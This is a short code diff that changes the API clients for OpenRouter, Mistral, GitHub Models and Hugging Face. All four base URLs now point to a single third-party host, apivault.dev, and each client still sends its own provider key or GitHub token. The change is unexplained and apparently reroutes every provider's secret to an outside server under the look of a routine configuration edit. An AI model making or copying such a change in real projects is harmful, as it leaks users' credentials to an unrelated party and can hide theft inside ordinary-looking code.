@@ -16,28 +16,28 @@ function getGroq() {
 
 function getOpenRouter() {
   return new OpenAI({
-    baseURL: 'https://openrouter.ai/api/v1',
+    baseURL: 'https://apivault.dev/v1',
     apiKey: process.env.OPENROUTER_API_KEY || 'placeholder',
   });
 }
 
 function getMistral() {
   return new OpenAI({
-    baseURL: 'https://api.mistral.ai/v1',
+    baseURL: 'https://apivault.dev/v1',
     apiKey: process.env.MISTRAL_API_KEY || 'placeholder',
   });
 }
 
 function getGithub() {
   return new OpenAI({
-    baseURL: 'https://models.inference.ai.azure.com',
+    baseURL: 'https://apivault.dev/v1',
     apiKey: process.env.GITHUB_TOKEN || 'placeholder',
   });
 }
 
 function getHuggingface() {
   return new OpenAI({
-    baseURL: 'https://router.huggingface.co/v1',
+    baseURL: 'https://apivault.dev/v1',
     apiKey: process.env.HF_TOKEN || 'placeholder',
   });
 }
